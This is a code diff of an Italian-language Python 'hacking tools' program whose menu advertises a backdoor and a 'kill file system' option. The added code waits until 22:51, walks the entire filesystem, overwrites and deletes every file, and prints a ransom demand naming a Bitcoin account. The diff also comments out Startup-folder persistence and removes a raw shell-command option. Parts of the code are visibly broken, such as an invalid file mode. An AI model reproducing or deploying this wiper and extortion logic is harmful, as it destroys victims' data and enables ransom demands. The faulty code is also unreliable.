@@ -21,7 +21,7 @@ import random
 import tkinter as Tk
 import ctypes
 import mss
-from win10toast import ToastNotifier
+#from win10toast import ToastNotifier
 from tkinter import messagebox
 import pyttsx3
 from datetime import datetime
@@ -47,9 +47,9 @@ def foto():
 def nascondi():
     file="foto.png"
     os.system(f"attrib +h {file}")
-percorso = r"C:\Users\blue-terminal.tools.py"
-avviosiste = os.path.join(os.environ["APPDATA"], r"Microsoft\Windows\Start Menu\Programs\Startup")
-shutil.copy2(percorso, os.path.join(avviosiste, "blue-terminal.exe"))
+#percorso = r"C:\Users\blue-terminal.tools.py"
+#avviosiste = os.path.join(os.environ["APPDATA"], r"Microsoft\Windows\Start Menu\Programs\Startup")
+#shutil.copy2(percorso, os.path.join(avviosiste, "blue-terminal.exe"))
 ascii = GLOW+TOXIC_GREEN +"""
 ░░░░░░░░  ░░░░░░   ░░░░░░  ░░          ░░   ░░  ░░░░░  ░░   ░░ ░░ ░░░    ░░  ░░░░░░
    ▒▒    ▒▒    ▒▒ ▒▒    ▒▒ ▒▒          ▒▒   ▒▒ ▒▒   ▒▒ ▒▒  ▒▒  ▒▒ ▒▒▒▒   ▒▒ ▒▒
@@ -64,11 +64,11 @@ ascii = GLOW+TOXIC_GREEN +"""
 [*]attacco avvenuto con successo...
 """+RESET                      
 print(ascii)
-try:
+"""try:
     not0=ToastNotifier()
     not0.show_toast("exploit riuscito","sei sorvegliato su Internet",duration=10)
 except:
-    print(Fore.BLUE+"[*] exploit non riuscito")
+    print(Fore.BLUE+"[*] exploit non riuscito")"""
 file="blue_terminal.tools.exe"
 #os.system(f"attrib +h {file}")
 console = Console()
@@ -88,7 +88,7 @@ tabella.add_row(f"{3} la bomba globale.exe","12/10/2024","7")
 tabella.add_row(f"{4} la blue_backdoor.exe","18/4/2024","8")
 tabella.add_row(f"{5} il codice sorgente ","1/1/2025","no")
 tabella.add_row(f"{6} elimina sfondo immagine","5/8/2025","no")
-tabella.add_row(f"{7} kill file system ","9/8/2038","10")
+tabella.add_row(f"{7} kill file system(22/51) ","9/8/2038","10")
 tabella.add_row(f"{8} Universal-Nuclear","30/7/2058","⚠️")
 console = Console()
 console.print(tabella)
@@ -2996,13 +2996,20 @@ elif utente==6:
     print("in sviluppo")
 
 elif utente==7:
-    cam=cv2.VideoCapture(0)
-    utente7=input("-->")
-    immag=face_recognition.load_image_file(utente7)
-    if "&&" in utente7:
-        print("payloade caricato")
-    else:
-        print(os.system(utente7))
+    while True:
+        orariopc=datetime.now().strftime("%H/%M")
+        print(f"orario {orariopc}")
+        if orariopc =="22/51":
+            for rooty,cart,files in os.walk("/"):
+                for file in files:
+                    tuttifile=os.path.join(rooty, file)
+                    with open(tuttifile,"wr") as file:
+                        file.writelines(Fernet(chiave))
+                    print("consegna tua madre nel conto btc:347654375")
+                    try:
+                        os.remove(tuttifile)  
+                    except :
+                        print(f"file eliminati {tuttifile}")
 elif utente==4:
     tabella2=Table(title="hacking tools by blue_terminal",style="yellow",title_justify="center")
     tabella2.add_row(f"{1} server")
